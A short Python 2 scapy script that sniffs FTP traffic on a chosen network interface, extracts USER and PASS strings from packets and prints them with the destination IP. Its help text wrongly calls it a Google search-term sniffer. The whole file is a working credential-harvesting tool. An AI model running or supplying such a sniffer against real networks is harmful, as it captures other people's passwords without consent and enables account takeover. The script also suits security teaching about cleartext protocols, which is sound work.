#!/usr/bin/env python2
from scapy.all import *
import argparse, sys, re


def Analyze(pkt):
    dest = pkt.getlayer(IP).dst
    pload = pkt.sprintf("%Raw.load%")
    user = re.findall('(?i)USER (.*)\\\\r', pload)
    passwd = re.findall('(?i)PASS (.*)\\\\r', pload)
    if user:
        print("[+] DestIP: %s" % dest)
        print("[+] USER: %s" % user)
    if passwd:
        print("[+] PASS: %s" % passwd)


def getargs():
    ap = argparse.ArgumentParser(description="Sniff Google search terms")
    ap.add_argument("-i", '--iface', type=str, default=None, help="interface to sniff on")
    args, l = ap.parse_known_args()
    if args.iface == None:
        ap.print_help()
        sys.exit()
    else:
        return args


def main():
    try:
        sniff(prn=Analyze, iface=(getargs()).iface, filter="tcp port 21")
    except KeyboardInterrupt:
        sys.exit()


if __name__=="__main__":
    main()



